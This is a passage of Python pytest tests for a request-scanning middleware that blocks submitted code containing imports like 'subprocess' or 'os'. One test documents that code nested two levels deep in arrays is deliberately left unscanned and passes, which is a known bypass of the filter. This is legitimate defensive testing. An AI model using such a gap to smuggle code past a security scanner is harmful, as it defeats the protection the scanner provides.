    async def test_array_of_dicts_clean_passes(self, mw):
        """Clean code inside array of dicts passes."""
        body = json.dumps({
            "items": [{"code": "x = 1"}],
            "language": "python",
        }).encode()
        req = self._req(body)
        ctx = self._ctx()
        result = await mw.process_request(req, ctx)
        assert result is None

    @pytest.mark.asyncio
    async def test_array_of_dicts_multiple_items(self, mw):
        """Dangerous code in any array item is caught."""
        body = json.dumps({
            "items": [
                {"code": "x = 1"},  # clean
                {"code": "import subprocess"},  # dangerous
            ],
            "language": "python",
        }).encode()
        req = self._req(body)
        ctx = self._ctx()
        result = await mw.process_request(req, ctx)
        assert isinstance(result, Response)
        assert result.status_code == 400

    @pytest.mark.asyncio
    async def test_deeply_nested_array_not_scanned(self, mw):
        """Depth 2+ arrays (array inside dict inside array) don't scan — bounded."""
        # This is intentionally NOT scanned (bounded to 1 level)
        body = json.dumps({
            "wrapper": [{"nested": [{"code": "import os"}]}],
            "language": "python",
        }).encode()
        req = self._req(body)
        ctx = self._ctx()
        result = await mw.process_request(req, ctx)
        # This depth-2 nesting is NOT scanned — that's acceptable
        # The code field is inside nested[0], not in wrapper[0] directly
        assert result is None

    @pytest.mark.asyncio
    async def test_unicode_escape_key_normalized(self, mw):
        r"""Unicode escape \u0063ode normalizes to 'code' — still scanned."""
        # Python json.loads normalizes \u0063 to 'c', so key becomes "code"
        body = b'{"\\u0063ode": "import os", "language": "python"}'
        req = self._req(body)
        ctx = self._ctx()
        result = await mw.process_request(req, ctx)
        # Python normalizes \u0063 to 'c' → key is "code" → scanned → blocked
        assert isinstance(result, Response)
        assert result.status_code == 400
